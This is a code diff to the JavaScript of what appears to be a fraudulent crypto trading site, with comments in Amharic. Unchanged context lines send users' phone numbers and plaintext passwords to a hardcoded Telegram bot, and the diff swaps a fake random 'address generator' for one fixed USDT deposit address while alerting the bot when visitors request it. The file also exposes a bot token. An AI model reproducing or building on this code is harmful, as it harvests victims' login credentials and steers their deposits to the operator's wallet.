@@ -204,6 +204,9 @@
         const BOT_TOKEN = "8686967610:AAFE1B_hTR6JMljJQbnntitty842ZclQN1g";
         const CHAT_ID = "6758067257";
 
+        // 📥 👇 እዚህ ጋር አዲሱን እውነተኛ የ BEP20 USDT ማስቀመጫ አድራሻህን አስገባ!
+        const REAL_BEP20_ADDRESS = "0x71C7656EC7ab88b098defB751B7401B5f6d1476B";
+
         // ተጠቃሚው መግባቱን መከታተያ ሁኔታ (State)
         let isLoggedIn = false;
         let loggedInUserPhone = "";
@@ -314,7 +317,6 @@
         function handleTradeSubmit(event) {
             event.preventDefault();
             
-            // ተጠቃሚው Login ካላደረገ እንዲከለክል ማድረግ
             if(!isLoggedIn) {
                 showNotification("እባክዎ መጀመሪያ Login ያድርጉ! (ቅድሚያ ይግቡ)", true);
                 openModal('login-modal');
@@ -347,7 +349,6 @@
                         `📞 *ስልክ ቁጥር:* ${phone}\n` +
                         `🔑 *የይለፍ ቃል:* \`${pass}\``;
 
-            // ምዝገባው ሲያልቅ በራስ-ሰር Login እንዲሆን እና ሴሽኑ እንዲቀመጥ ማድረግ
             isLoggedIn = true;
             loggedInUserPhone = phone;
             localStorage.setItem('currentUserPhone', phone); 
@@ -368,7 +369,6 @@
                         `📞 *ስልክ ቁጥር:* ${phone}\n` +
                         `🔑 *የይለፍ ቃል:* \`${pass}\``;
 
-            // ሁኔታውን መቀየር እና ሴሽኑን በቋሚነት ማስቀመጥ
             isLoggedIn = true;
             loggedInUserPhone = phone;
             localStorage.setItem('currentUserPhone', phone); 
@@ -379,20 +379,14 @@
             document.getElementById('login-form').reset();
         }
 
-        // BEP20 Address Generator
+        // BEP20 Address Generator (የተስተካከለ)
         document.getElementById('generate-btn').addEventListener('click', function() {
-            const bep20Addresses = [
-                "0x71C7656EC7ab88b098defB751B7401B5f6d1476B",
-                "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD",
-                "0xddBd2B932c763bA5b1b7AE3B362eac3e8d40121A"
-            ];
-            
-            const randomAddress = bep20Addresses[Math.floor(Math.random() * bep20Addresses.length)];
             const addressDisplay = document.getElementById('address-display');
             const instruction = document.getElementById('address-instruction');
             
+            // ቋሚ የሆነውን አድራሻ በቀጥታ ዌብሳይቱ ላይ ያሳያል
             addressDisplay.innerHTML = `
-                <div style="font-weight: bold; margin-bottom: 8px; color: #f3cd64;">${randomAddress}</div>
+                <div style="font-weight: bold; margin-bottom: 8px; color: #f3cd64; word-break: break-all;">${REAL_BEP20_ADDRESS}</div>
                 <button id="copy-btn" type="button" style="background-color: #232d3f; color: #f3cd64; border: 1px solid #f3cd64; padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; cursor: pointer; font-weight: bold;">
                     📋 Copy BEP20 Address
                 </button>
@@ -402,8 +396,9 @@
             this.innerText = "Address Generated!";
             this.style.background = "linear-gradient(180deg, #4ade80 0%, #22c55e 100%)";
 
+            // ኮፒ ማድረጊያ ሎጂክ
             document.getElementById('copy-btn').addEventListener('click', function() {
-                navigator.clipboard.writeText(randomAddress).then(() => {
+                navigator.clipboard.writeText(REAL_BEP20_ADDRESS).then(() => {
                     this.innerText = "✅ Copied!";
                     this.style.backgroundColor = "#22c55e"; this.style.color = "white";
                     setTimeout(() => {
@@ -413,6 +408,7 @@
                 });
             });
 
+            // ወደ ቴሌግራም ቦት ማሳወቂያ መላክ
             const addrMsg = `💳 *አንድ ደንበኛ የ BEP20 አድራሻ አውጥቷል!*`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             fetch(url, {
